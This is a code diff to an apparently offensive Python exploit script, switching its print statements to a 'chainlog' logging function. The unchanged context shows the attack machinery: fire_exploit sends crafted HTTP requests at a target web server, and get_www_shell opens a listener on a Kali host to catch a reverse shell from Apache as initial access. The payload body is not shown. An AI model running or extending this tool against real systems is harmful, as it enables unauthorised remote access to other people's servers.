@@ -3,6 +3,8 @@ import threading
 import time
 from urllib.parse import urlparse
 
+from chainlog import log
+
 
 def _build_request(method, host, path, body=""):
     """Assemble a raw HTTP/1.1 request string."""
@@ -33,7 +35,7 @@ def _send_request(host, port, request):
     except (socket.timeout, ConnectionResetError):
         pass  # expected once the reverse shell takes over the connection
     except Exception as e:
-        print(f"[-] Error sending request: {e}")
+        log(f"[-] Error sending request: {e}")
     finally:
         if s is not None:
             try:
@@ -87,9 +89,9 @@ def fire_exploit(target_url, lhost, lport, attempt_delay=0):
     last = len(attempts) - 1
     for i, (method, path, body, note) in enumerate(attempts):
         if i == last:
-            print(f"[*] Sending exploit to {host}:{port}{path}")
+            log(f"[*] Sending exploit to {host}:{port}{path}")
         else:
-            print(f"[*] Trying {method} {path} ({note})")
+            log(f"[*] Trying {method} {path} ({note})")
         _send_request(host, port, _build_request(method, host, path, body))
         if attempt_delay and i != last:
             time.sleep(attempt_delay)
@@ -107,7 +109,7 @@ def get_www_shell(target_ip, kali_ip, kali_port=4444, attempt_delay=0):
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(("0.0.0.0", kali_port))
     server.listen(1)
-    print(f"[*] Initial-access listener started on port {kali_port}...")
+    log(f"[*] Initial-access listener started on port {kali_port}...")
 
     # 2. Fire the exploit in the background
     threading.Thread(
@@ -118,10 +120,10 @@ def get_www_shell(target_ip, kali_ip, kali_port=4444, attempt_delay=0):
     server.settimeout(15)  # wait up to 15 seconds for success
     try:
         www_shell, addr = server.accept()
-        print(f"[+] Initial access successful. Shell received from {addr[0]}")
+        log(f"[+] Initial access successful. Shell received from {addr[0]}")
         return www_shell
     except socket.timeout:
-        print("[-] Timeout — no shell received from Apache.")
+        log("[-] Timeout — no shell received from Apache.")
         return None
     finally:
         server.close()  # release the listener port
